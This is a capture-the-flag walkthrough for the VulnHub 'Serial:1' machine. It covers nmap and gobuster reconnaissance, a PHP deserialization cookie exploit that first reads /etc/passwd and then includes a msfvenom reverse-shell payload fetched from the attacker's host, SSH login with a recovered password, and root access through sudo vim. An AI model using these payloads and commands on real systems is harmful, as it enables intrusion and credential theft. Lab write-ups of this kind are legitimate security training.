@@ -1,0 +1,342 @@
+1# Introduction:
+-----------------------------
+* Serial:1 is a boot2root macine from vulnhub on this link (https://www.vulnhub.com/entry/serial-1,349/) its size is 3.5 GB
+* Operating System : Ubuntu 19.04
+* Author : sk4 (https://www.vulnhub.com/author/sk4,633/)
+* Date release: 20 Aug 2019
+* I used VirtualBox to run the machine 
+
+
+
+
+
+2# Nmap:
+------------------------------
+[1] i run "nmap -sn 192.168.1.0/24" to know the ip of the machine and it was 192.168.1.10 and my ip was 192.168.1.3
+
+[2] i run "nmap -sS -sV -p1-65535 -sC 192.168.1.10" and the result was as follow:
+
+    Not shown: 65533 closed ports
+    PORT   STATE SERVICE VERSION
+
+    22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 f7:f2:95:6a:f2:97:e0:ff:9f:68:14:a0:3a:d8:e2:eb (RSA)
+    |   256 e0:1e:cf:6f:29:4e:09:bb:df:4a:08:08:44:d4:f0:49 (ECDSA)
+    |_  256 38:28:63:c6:e4:bc:38:7e:6f:c2:72:b3:42:26:17:22 (ED25519)
+
+    80/tcp open  http    Apache httpd 2.4.38 ((Ubuntu))
+    |_http-server-header: Apache/2.4.38 (Ubuntu)
+    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+    MAC Address: 08:00:27:4D:9B:6E (Oracle VirtualBox virtual NIC)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+there are 2 ports opened [ssh/22] & [http/80]
+
+
+
+
+
+3# Visit the website:
+-------------------------------
+[1] i went to 192.168.1.10 and i found a message said "Hello sk4This is a beta test for new cookie handler "
+[2] i opened burb and i found the Cookie of this site is [Cookie: user=Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0%3D]
+
+
+
+
+
+4# Bruteforcing the directories:
+---------------------------------
+[1] i used gobuster tool to bruteforce and the worldlist was common.txt from dirb tool.
+[2] i run the following command on the gobuster "gobuster dir -u 192.168.1.10 -w /usr/share/dirb/wordlists/common.txt -v" and it found the following:
+    Found: /.htpasswd (Status: 403)
+    Found: /.hta (Status: 403)
+    Found: /.htaccess (Status: 403)
+    Found: /backup (Status: 301)
+    Found: /index.php (Status: 200)
+    Found: /server-status (Status: 403)
+[3] i found "/backup" and i visited "192.168.1.10/backup" and i downloaded bak.zip and i found 3 php files.
+[4] the 3 files as follow :
+
+    //// first file: index.php and its content was 
+    
+    (
+    <?php
+	  include("user.class.php");
+
+	  if(!isset($_COOKIE['user'])) {
+		  setcookie("user", base64_encode(serialize(new User('sk4'))));
+	  } 
+    else {
+		  unserialize(base64_decode($_COOKIE['user']));
+	  }
+	  echo "This is a beta test for new cookie handler\n";
+    ?>
+    )
+    
+    
+    
+    
+    //// second file : log.class.php and its content was 
+    
+    (
+    <?php
+    class Log {
+      private $type_log;
+
+      function __costruct($hnd) {
+        $this->$type_log = $hnd;
+      }
+
+      public function handler($val) {
+        include($this->type_log);
+        echo "LOG: " . $val;
+      }
+    }
+    ?>
+    )
+    
+    
+    
+   ////  third file : user.class.php and its content was
+   
+    (
+    <?php
+      include("log.class.php");
+
+      class Welcome {
+        public function handler($val) {
+         echo "Hello " . $val;
+        }
+      }
+
+      class User {
+        private $name;
+        private $wel;
+
+        function __construct($name) {
+          $this->name = $name;
+          $this->wel = new Welcome();
+        }
+
+        function __destruct() {
+          //echo "bye\n";
+         $this->wel->handler($this->name);
+       }
+      }
+   ?>
+    )
+    
+    
+    
+
+5# Playing with the bak files:
+-------------------------------------
+
+[1] after the analysing of these files i found it was about cookie handler and i added the following line in index.php file
+    "echo base64_encode(serialize(new User('admin')));"
+    
+   then i run the file by "php index.php" and the result was as follow:
+   
+   Hello adminTzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7Tzo3OiJXZWxjb21lIjowOnt9fQ==Hello sk4PHP Warning:  Cannot modify header information - headers already sent by (output started at /root/Downloads/bak/user.class.php:6) in /root/Downloads/bak/index.php on line 5
+   This is a beta test for new cookie handler
+   Hello adminTzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7Tzo3OiJXZWxjb21lIjowOnt9fQ==
+   
+   it generated new cookie with the name admin so i continued analysing the rest of the remaining files and the log.class.php can include a log file but the variable was empty so i edited the file to be as follow:
+   
+   
+   <?php
+  class Log {
+    private $type_log = "/etc/passwd";
+
+    function __costruct($hnd) {
+      $this->$type_log = $hnd;
+    }
+
+    public function handler($val) {
+      include($this->type_log);
+      echo "LOG: " . $val;
+    }
+  }
+?>
+
+
+
+
+and i called it in the user.class.php and i edited this file to be:
+
+
+<?php
+  include("log.class.php");
+
+  class Welcome {
+    public function handler($val) {
+      echo "Hello " . $val;
+    }
+  }
+
+  class User {
+    private $name;
+    private $wel;
+
+    function __construct($name) {
+      $this->name = $name;
+      $this->wel = new Log();
+    }
+
+    function __destruct() {
+      //echo "bye\n";
+      $this->wel->handler($this->name);
+    }
+  }
+?>
+
+
+
+
+[2] then i generated the new cookie by run "php index.php" and the new cookie was as follow:
+    Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MTE6Ii9ldGMvcGFzc3dkIjt9fQ==
+    
+[3] then i intercepted the request and i replaced the old cookie with the generated one and the content of the page was as follow:
+    
+    
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false
+ntp:x:105:111::/nonexistent:/usr/sbin/nologin
+messagebus:x:106:112::/nonexistent:/usr/sbin/nologin
+arpwatch:x:107:113:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
+Debian-exim:x:108:114::/var/spool/exim4:/usr/sbin/nologin
+uuidd:x:109:115::/run/uuidd:/usr/sbin/nologin
+redsocks:x:110:116::/var/run/redsocks:/usr/sbin/nologin
+tss:x:111:117:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+rwhod:x:112:65534::/var/spool/rwho:/usr/sbin/nologin
+iodine:x:113:65534::/var/run/iodine:/usr/sbin/nologin
+miredo:x:114:65534::/var/run/miredo:/usr/sbin/nologin
+dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+postgres:x:116:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+usbmux:x:117:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:118:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
+stunnel4:x:119:127::/var/run/stunnel4:/usr/sbin/nologin
+sshd:x:120:65534::/run/sshd:/usr/sbin/nologin
+Debian-snmp:x:121:128::/var/lib/snmp:/bin/false
+sslh:x:122:129::/nonexistent:/usr/sbin/nologin
+pulse:x:123:131:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:124:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+avahi:x:125:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:126:135::/var/lib/saned:/usr/sbin/nologin
+inetsim:x:127:137::/var/lib/inetsim:/usr/sbin/nologin
+colord:x:128:138:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:129:139::/var/lib/geoclue:/usr/sbin/nologin
+king-phisher:x:130:140::/var/lib/king-phisher:/usr/sbin/nologin
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+
+
+
+so, we can include a file! what about including a php_reverse_shell?
+
+
+
+6# Making of a reverse shell and including it:
+----------------------------------------------
+
+[1] i generated a payload with msfvenom to make a reverse shell and i choosed the payload "php/reverse_php" and the command was as follow:
+   
+   "msfvenom -p php/reverse_php LHOST=192.168.1.3 LPORT=4444 > pay.php"
+   
+   
+   
+[2] then i made a simple server with python by the following command "python -m SimpleHTTPServer 80" to serve the generated payload
+
+
+[3] then i edited the log.class.php again to be as follow:
+
+
+
+<?php
+  class Log {
+    private $type_log = "http://192.168.1.3/pay.php";
+
+    function __costruct($hnd) {
+      $this->$type_log = $hnd;
+    }
+
+    public function handler($val) {
+      include($this->type_log);
+      echo "LOG: " . $val;
+    }
+  }
+?>
+
+
+[4] then i listened on the port 4444 by netcat tool by this command "nc -lv -p 4444"
+
+
+[5] then i generated the new cookie by "php index.php" and the cookie was as follow: 
+
+    Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MjY6Imh0dHA6Ly8xOTIuMTY4LjEuMy9wYXkucGhwIjt9fQ==
+    
+    
+ [6] then i intercepted the request and used the generated cookie and pingo! the conection between me and the machine was established 
+
+
+
+
+7# Looking for interesting files:
+--------------------------------------------------
+
+    i found this file on the machine "credentials.txt.bak" and i found a serprize "sk4:KywZmnPWW6tTbW5w"
+    
+  [1]  it looks like the password of the sk4 user so i sshed the machine and it was right "ssh sk4@192.168.1.10"
+    and i found the first flag!
+    
+    
+
+
+
+8# privilege escalation:
+--------------------------------------------------------
+    
+[1]    now it's time to privilege escalation
+    i typed the following "sudo -l" to show what process that i can run it with sudo and i found only vim.
+    
+[2]    i searched for privilege escalation with vim and managed to do it by following commands:
+
+    sudo vim
+    :!/bin/bash
+    
+    Pingo! i'm the root now and i found the second fl4g.txt and it was 
+    "Good! Serial pwned :D share this flag with me on twitter: @sk4pwn"
+    
+    Thanks for reading this and hope you lerned something new ^_^
+
+
+
+
